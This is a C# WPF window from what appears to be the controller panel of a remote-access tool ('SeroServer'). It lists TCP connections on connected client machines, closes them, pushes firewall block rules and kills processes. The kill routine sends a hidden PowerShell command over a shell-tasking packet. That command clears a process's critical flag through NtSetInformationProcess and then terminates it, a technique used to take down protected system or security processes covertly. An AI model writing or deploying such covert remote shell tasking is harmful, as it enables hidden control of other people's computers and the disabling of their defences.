using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Input;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class TcpManagerWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<TcpEntryVM> _entries = [];

    public TcpManagerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text  = clientLabel;
        GridTcp.ItemsSource = _entries;

        _server.RegisterHandler(clientId, PacketType.TcpListResult,       OnTcpList);
        _server.RegisterHandler(clientId, PacketType.TcpFirewallRulesResult, OnFirewallResult);

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.TcpListResult);
            _server.UnregisterHandler(clientId, PacketType.TcpFirewallRulesResult);
        };
        Loaded += async (_, _) => { await Task.Delay(Random.Shared.Next(0, 250)); await Refresh(); };
    }

    private async Task Refresh()
    {
        TxtStatus.Text = "Refreshing…";
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpGetList });
    }

    private void OnTcpList(Packet pkt)
    {
        try
        {
            var data = JsonConvert.DeserializeObject<TcpListResultData>(pkt.Data);
            if (data == null) return;
            Dispatcher.BeginInvoke(() =>
            {
                _entries.Clear();
                foreach (var e in data.Entries)
                    _entries.Add(new TcpEntryVM(e.Pid, e.ProcessName, e.LocalAddr, e.RemoteAddr, e.State));
                TxtStatus.Text = $"{_entries.Count} connection(s) — {DateTime.Now:HH:mm:ss}";
            });
        }
        catch { }
    }

    private void OnFirewallResult(Packet pkt)
    {
        try
        {
            var data = JsonConvert.DeserializeObject<TcpFirewallRulesResultData>(pkt.Data);
            Dispatcher.BeginInvoke(() =>
            {
                if (data == null || data.Rules.Count == 0)
                    TxtStatus.Text = "Firewall: rule failed (check admin privileges / firewall service)";
                else
                    TxtStatus.Text = $"Firewall: {data.Rules.Count} rule(s) applied — {string.Join(", ", data.Rules.Select(r => r.RuleName))}";
            });
        }
        catch { }
    }

    private async void Refresh_Click(object s, RoutedEventArgs e) => await Refresh();

    private async void CloseConn_Click(object s, RoutedEventArgs e)
    {
        var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().ToList();
        if (sel.Count == 0) return;
        string confirmMsg = sel.Count == 1
            ? $"Close TCP connection {sel[0].RemoteAddr} ({sel[0].ProcessName})?"
            : $"Close {sel.Count} TCP connections?";
        if (MessageBox.Show(confirmMsg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var row in sel)
        {
            var data = JsonConvert.SerializeObject(new TcpCloseData { LocalAddr = row.LocalAddr, RemoteAddr = row.RemoteAddr });
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpClose, Data = data });
        }
        await Task.Delay(300);
        await Refresh();
    }

    private async void KillProc_Click(object s, RoutedEventArgs e)
    {
        var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().Where(r => r.Pid > 0).ToList();
        if (sel.Count == 0) return;
        string confirmMsg = sel.Count == 1
            ? $"Kill '{sel[0].ProcessName}' (PID {sel[0].Pid})?"
            : $"Kill {sel.Count} processes?";
        if (MessageBox.Show(confirmMsg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var row in sel)
        {
            var cmd = $"powershell -NoP -NonI -W H -Command \"" +
                      $"Add-Type -TypeDefinition @'`n" +
                      $"using System.Runtime.InteropServices;`n" +
                      $"public class PK {{`n" +
                      $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
                      $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
                      $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
                      $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
                      $"}}`n" +
                      $"'@ -ErrorAction SilentlyContinue;" +
                      $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
                      $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
                      $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
        }
        TxtStatus.Text = sel.Count == 1 ? $"Kill sent → PID {sel[0].Pid} ({sel[0].ProcessName})" : $"Kill sent → {sel.Count} processes";
        await Task.Delay(600);
        await Refresh();
    }

    private async void BlockIp_Click(object s, RoutedEventArgs e)
    {
        var selected = GridTcp.SelectedItem as TcpEntryVM;
        string? defIp = selected?.RemoteAddr?.Split(':').FirstOrDefault();
        var ip = SimpleInput("Block remote IP in firewall (inbound + outbound):", defIp ?? "");
        if (string.IsNullOrWhiteSpace(ip)) return;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.TcpFirewallBlock,
            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = 0, RemoteIp = ip, Direction = "both" })
        });
        TxtStatus.Text = $"🛡 Firewall block sent → IP {ip}";
    }

    private async void BlockProcess_Click(object s, RoutedEventArgs e)
    {
        var selected = GridTcp.SelectedItem as TcpEntryVM;
        var name = SimpleInput("Block process (full path or name):", selected?.ProcessName ?? "");
        if (string.IsNullOrWhiteSpace(name)) return;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.TcpFirewallBlock,
            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = name, Port = 0, Direction = "both" })
        });
        TxtStatus.Text = $"Firewall block sent → {name} (in+out)";
    }

    private async void BlockPort_Click(object s, RoutedEventArgs e)
    {
        var selected = GridTcp.SelectedItem as TcpEntryVM;
        string? defPort = null;
        if (selected?.LocalAddr?.Contains(':') == true &&
            int.TryParse(selected.LocalAddr.Split(':').Last(), out _))
            defPort = selected.LocalAddr.Split(':').Last();

        var portStr = SimpleInput("Block port (TCP):", defPort ?? "");
        if (!int.TryParse(portStr, out int port) || port <= 0) return;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.TcpFirewallBlock,
            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = port, Direction = "both" })
        });
        TxtStatus.Text = $"Firewall block sent → port {port} (in+out)";
    }

    private static string? SimpleInput(string prompt, string? def = null)
    {
        var dlg = new Window
        {
            Title = "Input", Width = 380, Height = 120,
            WindowStartupLocation = WindowStartupLocation.CenterOwner,
            ResizeMode = ResizeMode.NoResize, WindowStyle = WindowStyle.ToolWindow,
            Background = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0x12, 0x14, 0x22))
        };
        var sp  = new System.Windows.Controls.StackPanel { Margin = new Thickness(12) };
        var lbl = new System.Windows.Controls.TextBlock { Text = prompt, Foreground = System.Windows.Media.Brushes.White, Margin = new Thickness(0,0,0,6) };
        var txt = new System.Windows.Controls.TextBox   { Text = def ?? "", Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x1A,0x1C,0x2E)), Foreground = System.Windows.Media.Brushes.White, BorderBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x4A,0x85,0xF5)), BorderThickness = new Thickness(1), Padding = new Thickness(4), Margin = new Thickness(0,0,0,8) };
        var btn = new System.Windows.Controls.Button    { Content = "OK", Width = 70, HorizontalAlignment = HorizontalAlignment.Right, Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x4A,0x85,0xF5)), Foreground = System.Windows.Media.Brushes.White, BorderThickness = new Thickness(0), Padding = new Thickness(0,4,0,4) };
        btn.Click  += (_, _) => dlg.DialogResult = true;
        txt.KeyDown += (_, ke) => { if (ke.Key == Key.Enter) dlg.DialogResult = true; };
        sp.Children.Add(lbl); sp.Children.Add(txt); sp.Children.Add(btn);
        dlg.Content = sp;
        txt.SelectAll(); txt.Focus();
        return dlg.ShowDialog() == true ? txt.Text : null;
    }

    private bool _max;
    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _max = !_max; WindowState = _max ? WindowState.Maximized : WindowState.Normal;
        BtnMaxTcp.Content = _max ? "❐" : "☐";
    }
    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized) DragMove();
    }

    private void ResizeGrip_DragDelta(object s, System.Windows.Controls.Primitives.DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }

    private void GridTcp_CopyLocal_Click(object s, RoutedEventArgs e)
    {
        if (GridTcp.SelectedItem is TcpEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.LocalAddr); TxtStatus.Text = $"Copied: {vm.LocalAddr}"; } catch { }
    }

    private void GridTcp_CopyRemote_Click(object s, RoutedEventArgs e)
    {
        if (GridTcp.SelectedItem is TcpEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.RemoteAddr); TxtStatus.Text = $"Copied: {vm.RemoteAddr}"; } catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}

public record TcpEntryVM(int Pid, string ProcessName, string LocalAddr, string RemoteAddr, string State);
